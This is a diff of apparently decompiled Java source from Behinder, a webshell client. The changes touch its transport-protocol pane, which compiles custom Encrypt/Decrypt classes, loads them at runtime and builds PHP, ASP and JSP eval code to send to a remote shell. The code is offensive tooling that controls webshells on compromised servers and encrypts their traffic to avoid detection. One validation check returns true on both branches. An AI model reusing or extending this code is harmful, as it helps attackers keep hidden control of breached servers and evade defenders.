@@ -24,6 +24,7 @@ import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import net.rebeyond.behinder.core.Constants;
 import net.rebeyond.behinder.core.IShellService;
+import net.rebeyond.behinder.core.Params;
 import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.dao.ShellManager;
 import net.rebeyond.behinder.dao.TransProtocolDao;
@@ -126,6 +127,7 @@ public class TransProtocolPaneController {
                   this.transProtocolDao.addEntity(transProtocolLocal);
                } catch (AlreadyExistException var10) {
                   this.transProtocolDao.updateTransProtocol(this.currentName, "jsp", localEncode, localDecode);
+                  Params.payloadClassCache.remove(this.currentName);
                }
 
                if (!this.currentType.equals("jsp")) {
@@ -172,7 +174,7 @@ public class TransProtocolPaneController {
          this.encryptTxt.setTooltip(new Tooltip(Base64.getEncoder().encodeToString(newValue.getBytes())));
       });
       this.decodeBtn.setOnAction((event) -> {
-         byte[] encryptContent = (byte[])((byte[])this.encryptTxt.getUserData());
+         byte[] encryptContent = (byte[])this.encryptTxt.getUserData();
 
          try {
             byte[] decryptContent = this.decode(encryptContent);
@@ -206,7 +208,7 @@ public class TransProtocolPaneController {
             } else if (this.currentType.equals("php")) {
                evalCode = Constants.PHP_EVAL_CODE_ENCRYPT_TEMPLATE;
                encryptContent = Utils.getRandomAlpha(6);
-               encodeRemoteSource = encodeRemoteSource.replaceFirst("encrypt", encryptContent);
+               encodeRemoteSource = encodeRemoteSource.replaceFirst("Encrypt", encryptContent);
                code = String.format(evalCode, encryptContent, clearContent, encodeRemoteSource);
             } else if (this.currentType.equals("asp")) {
                evalCode = Constants.ASP_EVAL_CODE_ENCRYPT_TEMPLATE;
@@ -234,14 +236,14 @@ public class TransProtocolPaneController {
             this.encryptRemoteTxt.setText(new String(encryptBytes));
             this.encryptRemoteTxt.setUserData(encryptBytes);
          } catch (Exception var11) {
-            System.out.println(var11.getMessage());
+            var11.printStackTrace();
             Utils.showErrorMessage("错误", "验证Shell连接失败");
          }
 
       });
       this.decodeRemoteBtn.setOnAction((event) -> {
          String decodeRemoteSource = this.getCode(this.decodeWebviewRemote);
-         String encryptContent = Base64.getEncoder().encodeToString((byte[])((byte[])this.encryptRemoteTxt.getUserData()));
+         String encryptContent = Base64.getEncoder().encodeToString((byte[])this.encryptRemoteTxt.getUserData());
 
          try {
             IShellService shellService = new ShellService(this.currentShell);
@@ -262,7 +264,7 @@ public class TransProtocolPaneController {
             } else if (this.currentType.equals("php")) {
                evalCode = Constants.PHP_EVAL_CODE_DECRYPT_TEMPLATE;
                decryptContent = Utils.getRandomAlpha(6);
-               decodeRemoteSource = decodeRemoteSource.replaceFirst("decrypt", decryptContent);
+               decodeRemoteSource = decodeRemoteSource.replaceFirst("Decrypt", decryptContent);
                code = String.format(evalCode, decryptContent, encryptContent, decodeRemoteSource);
             } else if (this.currentType.equals("asp")) {
                evalCode = Constants.ASP_EVAL_CODE_DECRYPT_TEMPLATE;
@@ -386,7 +388,7 @@ public class TransProtocolPaneController {
                String transName = var4[var6];
 
                try {
-                  String transProtocolConfig = new String(Utils.getResourceData("net/rebeyond/behinder/resource/transprotocol/default_" + transName + ".json"));
+                  String transProtocolConfig = new String(Utils.getResourceData("net/rebeyond/behinder/resource/transprotocol/default_" + transName + ".config"));
                   JSONArray transProtocols = new JSONArray(transProtocolConfig);
 
                   for(int i = 0; i < transProtocols.length(); ++i) {
@@ -470,7 +472,6 @@ public class TransProtocolPaneController {
          byte[] decryptContent = this.decode(encryptContent);
          return Arrays.equals(clearContent, decryptContent) ? true : true;
       } catch (Exception var4) {
-         System.out.println(var4.getMessage());
          Optional buttonType = Utils.showConfirmMessage("确认", "传输协议加解密一致性校验未通过，是否仍然保存？");
          return buttonType.get() == ButtonType.OK;
       }
@@ -501,20 +502,20 @@ public class TransProtocolPaneController {
    private byte[] encode(byte[] clearContent) throws Exception {
       String sourceCode = String.format(Constants.JAVA_CODE_TEMPLATE_SHORT, this.getCode(this.encodeWebview));
       byte[] payload = Utils.getClassFromSourceCode(sourceCode);
-      Class encodeCls = (new TransProtocolPaneController.U(this.getClass().getClassLoader())).g(payload);
+      Class encodeCls = (new U(this.getClass().getClassLoader())).g(payload);
       Method encodeMethod = encodeCls.getDeclaredMethod("Encrypt", byte[].class);
       encodeMethod.setAccessible(true);
-      byte[] result = (byte[])((byte[])encodeMethod.invoke(encodeCls.newInstance(), clearContent));
+      byte[] result = (byte[])encodeMethod.invoke(encodeCls.newInstance(), clearContent);
       return result;
    }
 
    private byte[] decode(byte[] encryptContent) throws Exception {
       String sourceCode = String.format(Constants.JAVA_CODE_TEMPLATE_SHORT, this.getCode(this.decodeWebview));
       byte[] payload = Utils.getClassFromSourceCode(sourceCode);
-      Class encodeCls = (new TransProtocolPaneController.U(this.getClass().getClassLoader())).g(payload);
+      Class encodeCls = (new U(this.getClass().getClassLoader())).g(payload);
       Method encodeMethod = encodeCls.getDeclaredMethod("Decrypt", byte[].class);
       encodeMethod.setAccessible(true);
-      byte[] result = (byte[])((byte[])encodeMethod.invoke(encodeCls.newInstance(), encryptContent));
+      byte[] result = (byte[])encodeMethod.invoke(encodeCls.newInstance(), encryptContent);
       return result;
    }
 
